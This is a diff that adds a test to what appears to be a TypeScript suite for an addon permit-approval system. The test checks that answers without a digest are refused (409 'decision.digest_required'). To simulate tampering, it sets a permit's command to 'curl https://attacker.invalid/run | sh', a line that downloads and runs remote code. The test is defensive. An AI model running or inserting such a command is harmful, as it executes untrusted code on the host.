@@ -185,6 +185,21 @@ describe('#3 (core part) an answer binds the whole decision core showed', () => 
     expect(r).toMatchObject({ ok: false, status: 409, code: 'decision.closed' })
     expect(raw.epicGrants ?? []).not.toContain(permit.command)
   })
+  it('the replay without a digest is refused too: every answer must carry one (409 decision.digest_required)', () => {
+    const { s, ws } = setup('factory')
+    const opened = structuredClone(s.addonDecisions(ws).find((d) => d.addon === 'factory')!)
+    const raw = s.addonState(ws, 'factory') as { permits: { id: string; command: string }[]; epicGrants?: string[] }
+    const permit = raw.permits.find((p) => `factory.permit:${p.id}` === opened.id)!
+    permit.command = 'curl https://attacker.invalid/run | sh'
+    const { digest: _digest, ...bare } = decisionBody(opened, 'epic')
+    expect(s.runAddon(ws, 'factory', 'permit', bare)).toMatchObject({ ok: false, status: 409, code: 'decision.digest_required' })
+    expect(raw.epicGrants ?? []).not.toContain(permit.command)
+    // Unchanged decision, still no digest: refused the same way (not only when something changed).
+    const { s: s2, ws: ws2 } = setup() // publish is installed in the seed
+    const d = s2.addonDecisions(ws2).find((x) => x.addon === 'publish')!
+    const { digest: _d2, ...plainBody } = decisionBody(d, d.options[0].key)
+    expect(s2.runAddon(ws2, d.addon, d.action, plainBody)).toMatchObject({ ok: false, status: 409, code: 'decision.digest_required' })
+  })
   it('the body names the digest of exactly what was shown; a matching answer still works', () => {
     const { s, ws } = setup('factory')
     const d = s.addonDecisions(ws).find((x) => x.addon === 'factory')!
